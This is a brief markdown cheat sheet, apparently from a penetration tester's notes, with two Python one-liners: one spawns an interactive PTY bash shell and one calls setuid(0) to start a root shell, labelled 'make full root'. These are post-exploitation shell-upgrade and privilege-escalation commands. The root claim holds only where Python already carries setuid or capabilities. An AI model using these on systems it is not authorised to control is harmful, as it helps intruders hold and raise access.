
#### Python3 bash shell

pty shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

make full root.
```
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```


#shell 

